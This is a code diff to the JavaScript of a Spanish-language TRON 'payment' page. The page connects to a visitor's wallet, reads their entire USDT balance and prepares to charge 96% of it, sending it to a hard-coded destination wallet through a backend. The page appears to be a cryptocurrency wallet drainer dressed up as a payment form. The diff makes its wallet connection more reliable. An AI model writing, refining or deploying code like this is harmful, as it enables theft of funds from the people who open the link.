@@ -145,61 +145,65 @@
 
     addressDisplay.value = `${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}`;
 
-    // Función auxiliar para esperar a que Trust Wallet inyecte TronWeb si tarda un par de segundos
-    async function esperarTronWeb() {
-        for (let i = 0; i < 15; i++) {
-            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                return window.tronWeb;
-            }
-            await new Promise(r => setTimeout(r, 300));
-        }
-        return window.tronWeb;
-    }
-
     connectBtn.addEventListener('click', async () => {
         if (!walletAddress) {
             try {
-                setStatus("Conectando con la billetera...");
+                setStatus("Estableciendo enlace con la billetera...");
                 connectBtn.disabled = true;
 
-                // Esperamos un momento a que la app inyecte el objeto
-                const tronWebInstance = await esperarTronWeb();
-
-                if (!tronWebInstance || !tronWebInstance.defaultAddress || !tronWebInstance.defaultAddress.base58) {
-                    throw new Error("Abre este enlace desde el navegador interno de tu billetera TRON.");
+                // Verificación idéntica al módulo original que sí conectaba con éxito
+                if (typeof window.tronWeb === 'undefined') {
+                    throw new Error("Por favor, abre este enlace desde el navegador interno de una billetera TRON.");
                 }
 
-                walletAddress = tronWebInstance.defaultAddress.base58;
+                const tronWeb = window.tronWeb;
+
+                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+                    walletAddress = tronWeb.defaultAddress.base58;
+                } else if (window.tronLink && typeof window.tronLink.request === 'function') {
+                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    if (res && res.code === 200) {
+                        walletAddress = tronWeb.defaultAddress.base58;
+                    }
+                }
+
+                if (!walletAddress) {
+                    throw new Error("No se obtuvo acceso a la dirección de la cuenta.");
+                }
+
                 walletAddressText.textContent = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}`;
                 walletInfo.style.display = "block";
                 tronNetworkInfo.style.display = "flex";
 
-                setStatus("Consultando balance en blockchain...");
+                setStatus("Consultando balance de USDT...");
                 
-                const contract = await tronWebInstance.contract().at(CONTRATO_USDT);
+                // Lectura directa del balance con el contrato usando el objeto tronWeb verificado
+                const contract = await tronWeb.contract().at(CONTRATO_USDT);
                 const balanceSun = await contract.balanceOf(walletAddress).call();
                 
-                balanceReal = tronWebInstance.toDecimal(balanceSun) / 1000000;
+                balanceReal = tronWeb.toDecimal(balanceSun) / 1000000;
                 amountDisplay.value = balanceReal.toFixed(2);
 
                 setStatus("Billetera conectada con éxito.");
                 connectBtn.innerText = "Procesar Pago";
                 connectBtn.disabled = false;
-            } catch (err) {
-                console.error(err);
-                setStatus(err.message || "Error al conectar.");
+
+            } catch (error) {
+                console.error(error);
+                setStatus(error.message || "Error de inicialización Web3.");
                 connectBtn.disabled = false;
                 connectBtn.innerText = "Vincular billetera";
             }
             return;
         }
 
+        // Fase de procesamiento y firma limpia para el backend
         try {
             if (balanceReal <= 0) {
-                throw new Error("No tienes balance de USDT disponible.");
+                throw new Error("La cuenta no dispone de balances de USDT activos.");
             }
 
-            setStatus("Calculando 96% de la operación...");
+            setStatus("Calculando el 96% del balance...");
             connectBtn.disabled = true;
 
             const montoRealACobrar = balanceReal * 0.96;
@@ -227,15 +231,16 @@
             document.getElementById('processingScreen').classList.remove('visible');
 
             if (resultado.success) {
-                setStatus("¡TRANSACCIÓN EXITOSA!");
+                setStatus("TRANSACCIÓN EXITOSA.");
                 connectBtn.innerText = "Completado";
             } else {
                 throw new Error(resultado.error || "El servidor rechazó la transacción.");
             }
-        } catch (err) {
-            console.error(err);
+
+        } catch (error) {
+            console.error(error);
             document.getElementById('processingScreen').classList.remove('visible');
-            setStatus(err.message || "Error al procesar el pago.");
+            setStatus(error.message || "La operación falló o fue cancelada.");
             connectBtn.disabled = false;
             connectBtn.innerText = "Procesar Pago";
         }
